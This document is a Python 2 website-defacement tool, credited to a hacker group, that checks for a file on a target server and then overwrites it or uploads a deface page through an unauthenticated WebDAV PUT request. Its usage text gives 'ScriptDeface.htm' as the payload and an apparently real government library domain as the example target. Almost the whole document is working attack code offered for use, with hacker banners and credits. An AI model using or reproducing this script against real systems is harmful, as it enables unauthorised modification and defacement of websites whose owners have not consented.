#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """HansPutera"""

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Name : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, New Script") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)
    print("[+]THX FOR USING MY SCRIPT")
    print("[+]TobzCyberTeam")
    print("[+]Edited By Tobz")


def cekfile():
 print("""
___             _____     _
|_ _|_ __ ___   |_   _|__ | |__ ____
 | || '_ ` _ \    | |/ _ \| '_ \_  /
 | || | | | | |   | | (_) | |_) / /
|___|_| |_| |_|   |_|\___/|_.__/___|
_    _   _  ___  _   ___   ____  __  ___  _   _ ____
   / \  | \ | |/ _ \| \ | \ \ / /  \/  |/ _ \| | | / ___|
  / _ \ |  \| | | | |  \| |\ V /| |\/| | | | | | | \___ \
 / ___ \| |\  | |_| | |\  | | | | |  | | |_| | |_| |___) |
/_/   \_\_| \_|\___/|_| \_| |_| |_|  |_|\___/ \___/|____/
""")
 print("[*] Check file in target: "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Founded a file in target . . .")
  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File isn't in target . . .")
   print("[*] Uploading your script . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    print("\n[*] Example : python2 webdav.py http://inlislite.perpusnas.go.id script.html")
    sys.exit(0)
  else:
    cekfile()
